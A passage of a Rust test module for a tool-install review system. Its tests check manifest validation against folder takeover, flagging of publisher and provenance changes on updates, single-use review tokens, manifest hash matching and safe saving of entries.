        assert!(matches!(manifest_in(&linked), Err(Refusal::BadManifest { rule, .. }) if rule.contains("link")));
    }

    #[test]
    fn a_manifest_that_names_itself_after_another_program_cannot_take_its_folder() {
        for name in ["gh", "keyrings", "nvim"] {
            let mut m = with_desktop("storage", json!({ "app": name, "env": name.to_uppercase() }));
            m["name"] = json!(name);
            assert!(matches!(refused(&Fake::with(&m)), Refusal::BadManifest { key, .. } if key == "storage"), "{name}");
        }
    }

    #[test]
    fn a_data_folder_not_named_after_the_tool_is_refused() {
        for app in ["gh", "keyrings"] {
            let m = with_desktop("storage", json!({ "app": app, "env": "ACME_CRM" }));
            assert!(matches!(refused(&Fake::with(&m)), Refusal::BadManifest { key, .. } if key == "storage"), "{app}");
        }
    }

    #[test]
    fn an_update_keeps_its_id_and_flags_new_publishers_provenance_parts_and_commands() {
        let first = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap();
        let first_entry = first.entry.clone();
        let saved = json!({ "version": 1, "tools": [first.entry] }).to_string();

        let mut renamed = manifest();
        renamed["name"] = json!("acme-sales");
        renamed["desktop"]["skill"] = json!({ "status": ["skill", "status"], "install": ["skill", "install"],
            "show": ["skill", "show"] });
        renamed["commands"].as_array_mut().unwrap().push(json!({ "path": ["deals", "list"],
            "effects": { "remote": "read", "local": "none" } }));
        let mut fake = Fake::with(&renamed);
        let mut view = fake.view.clone().unwrap();
        view["maintainers"] = json!(["someone-else <x@example.com>"]);
        fake.view = Ok(view);
        let r = review("@example/acme-crm-cli", None, &fake, catalog(), &saved).unwrap();
        assert_eq!(r.tool.id, "acmecrm", "the saved id stays");
        let change = r.review.update.unwrap();
        assert!(change.confirm && change.publishers_changed && !change.provenance_changed);
        assert_eq!(change.from_publishers, ["example"]);
        assert_eq!(change.new_parts, ["skill"]);
        assert_eq!(change.new_commands, ["deals list"]);
        assert_eq!(change.new_writes, Vec::<String>::new());

        let mut old = r.entry.clone();
        old["own"]["built"] = json!({ "repo": "https://github.com/example/acme-crm-cli", "workflow": "x" });
        let saved = json!({ "version": 1, "tools": [old] }).to_string();
        let gone = review("@example/acme-crm-cli", None, &fake, catalog(), &saved).unwrap();
        assert!(gone.review.update.unwrap().provenance_changed, "provenance that disappears asks again");

        let mut words = manifest();
        words["desktop"]["doctor"] = json!(["{profile}", "doctor", "--json", "--record", "--fix"]);
        words["desktop"]["signIn"]["asks"] = json!("your password");
        let saved = json!({ "version": 1, "tools": [first_entry] }).to_string();
        let r = review("@example/acme-crm-cli", None, &Fake::with(&words), catalog(), &saved).unwrap();
        let change = r.review.update.unwrap();
        assert_eq!(change.changed_parts, ["signIn", "doctor"]);
        assert!(change.confirm);
    }

    #[test]
    fn an_update_keeps_the_folders_recorded_at_the_first_add() {
        let first = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap();
        assert!(first.entry["own"]["preexisting"].is_null(), "recorded at add, before the install");
        let mut saved = first.entry.clone();
        saved["own"]["preexisting"] = json!({ "/home/u/.config/example-acme-crm-cli": true });
        let file = json!({ "version": 1, "tools": [saved.clone()] }).to_string();
        let update = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), &file).unwrap();
        assert_eq!(update.entry["own"]["preexisting"], saved["own"]["preexisting"]);
        assert_eq!(with_preexisting(&update.entry, &update.tool)["own"]["preexisting"], saved["own"]["preexisting"]);
    }

    #[test]
    fn a_review_token_installs_once() {
        let r = review("@example/acme-crm-cli", None, &Fake::with(&manifest()), catalog(), "").unwrap();
        let token = r.review.token.clone();
        REVIEWS.lock().unwrap().insert(token.clone(), Arc::new(r));
        assert!(take_review(&token).is_ok());
        assert!(take_review(&token).is_err());
        assert!(take_added(&token).is_err(), "Uninstall is only for a review Add used");
    }

    #[test]
    fn a_saved_entry_without_a_repository_passes_every_rule_at_the_next_start() {
        let mut m = manifest();
        m["desktop"]["sync"] = json!({ "run": ["{profile}", "sync", "--record", "--json"], "last": null,
            "lastShape": "runs", "what": "contacts and deals", "note": null });
        let mut fake = Fake::with(&m);
        let mut view = fake.view.clone().unwrap();
        view["repository"] = json!({ "url": "https://gitlab.com/example/acme-crm-cli" });
        view["homepage"] = json!("https://example.com/acme-crm");
        fake.view = Ok(view);
        let r = review("@example/acme-crm-cli", None, &fake, catalog(), "").unwrap();
        assert!(r.review.repo.is_none() && r.entry["repo"].is_null());
        assert_eq!(r.entry["sync"]["what"], "records");

        let dir = std::env::temp_dir().join(format!("wirecat-own-start-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let file = dir.join(community::FILE);
        save(&file, &r.entry).unwrap();
        let (tools, extra) = community::parse(&std::fs::read_to_string(&file).unwrap(), catalog());
        assert!(extra.rejected.is_empty(), "{:?}", extra.rejected);
        assert_eq!((tools.len(), tools[0].source, tools[0].repo.as_str()), (1, Source::Own, ""));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_installed_tool_must_describe_the_reviewed_manifest() {
        assert!(describe_matches(r#"{"wcat_describe":2,"manifest_sha256":"ABC"}"#, "abc").is_ok());
        assert!(describe_matches(r#"{"wcat_describe":2,"manifest_sha256":"abd"}"#, "abc").is_err());
        assert!(describe_matches(r#"{"wcat_describe":1}"#, "abc").is_err());
        assert!(describe_matches(&"x".repeat(MAX_DESCRIBE + 1), "abc").is_err());
    }

    #[test]
    fn entries_are_saved_replaced_and_removed_in_place() {
        let dir = std::env::temp_dir().join(format!("wirecat-own-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let file = dir.join(community::FILE);
        let entry = json!({ "id": "acmecrm", "package": "@example/acme-crm-cli", "own": { "version": "0.3.0" } });
        save(&file, &entry).unwrap();
        let mut newer = entry.clone();
        newer["own"]["version"] = json!("0.4.0");
        save(&file, &newer).unwrap();
        let entries = read_entries(&file).unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0]["own"]["version"], "0.4.0");
        assert!(!file.with_extension("json.partial").exists());
        remove(&file, "acmecrm").unwrap();
        assert_eq!(read_entries(&file).unwrap(), Vec::<Value>::new());
        assert!(remove(&file, "acmecrm").is_err());
        std::fs::write(&file, "{").unwrap();
        assert!(save(&file, &entry).is_err(), "a broken file is never overwritten");
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
